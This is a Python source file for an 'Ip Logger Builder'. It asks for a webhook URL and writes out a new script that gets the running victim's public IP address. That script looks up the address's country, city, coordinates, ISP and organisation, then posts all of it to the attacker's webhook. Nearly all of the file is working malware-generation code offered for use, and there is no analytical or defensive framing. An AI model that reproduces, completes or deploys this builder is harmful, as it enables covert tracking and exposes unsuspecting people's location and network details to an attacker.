try:
    import os
    from os import system
    system("title " + "Ip Logger Builder,   Made By blob#0005,   Github: github.com/blob0005")
except:
    pass
try:
    import os
except Exception:
    pass
try:
    import requests
except Exception:
    while True:
        e = input("Requests Module Missing, Wanna Try Auto Fix It (y/n): ")
        if e == "y" or e == "n":
            break
        else:
            print("Enter A Valid Choice")
    if e == "n":
        exit()
    if e == "y":
        try:
            os.system("pip install requests")
            print("It Shod Be Fixed Now, Press Enter To Start Main Program")
            input("")
        except Exception:
            print("Error Fixing, Press Enter To Close Program")
            input("")
            exit()
while True:
    name = input("Enter What You Want Logger Name To Be: ")
    temp = len(name)
    if int(temp) > 135:
        print("To Long Name")
    if int(temp) < 135:
        break
code = """import requests
url = "https://api.ipify.org"
r = requests.get(url).text
r = str(r)
requests.post(webhook, json={"content": f"@everyone ```Ip: {r}```"})
r2 = requests.get(f"http://ip-api.com/json/{r}").json()
"""
code2 = 'info = "Country: " + r2["country"] + "\n" +  "Country Code: " + r2["countryCode"] + "\n" + "Region Name: " + r2["regionName"] + "\n" + "City: " + r2["city"] + "\n" + "Zip Code: " + r2["zip"] + "\n" + "Lat: " + str(r2["lat"]) + "\n" + "Lon: " + str(r2["lon"]) + "\n" + "Timezone: " + r2["timezone"] + "\n" + "ISP: " + r2["isp"] + "\n" + "Org: " + r2["org"] + "\n" + "AS: " + r2["as"]'
code3 = 'requests.post(webhook, json={"content": f"```Ip Info: {info}```"})'
while True:
    try:
        webhook = input("Enter Webhook: ")
        r = requests.get(webhook)
        if "200" in str(r):
            break
        if "200" not in str(r):
            print("Webhook Invalid")
    except Exception:
        print("Webhook Invalid")
try:
    file = open(f"{name}.py", "a")
    file.write(f'webhook = "{webhook}"\n')
    file.write(code)
    file.write(repr(code2)[1:-1]+"\n")
    file.write(code3)
    file.close()
except:
    print("Unkown Error")
    input("")
    exit()
print("Succsesfully Made File")
input("")
exit()
